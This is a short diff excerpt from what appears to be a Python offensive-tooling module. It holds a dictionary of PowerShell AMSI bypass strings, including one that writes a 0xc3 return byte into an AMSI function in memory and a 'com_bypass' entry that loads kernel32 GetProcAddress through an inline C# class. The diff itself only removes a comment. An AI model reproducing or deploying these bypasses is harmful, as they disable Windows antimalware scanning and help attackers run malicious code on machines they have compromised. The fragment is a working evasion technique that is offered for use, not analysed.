@@ -31,7 +31,6 @@ _AMSI_PATCHES: dict[str, str] = {
         "[System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($d+0x11),[Byte]0xc3)"
     ),
     "com_bypass": (
-        # Overwrite amsiInitFailed via COM object
         "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;"
         "public class Bypass{"
         "[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);"
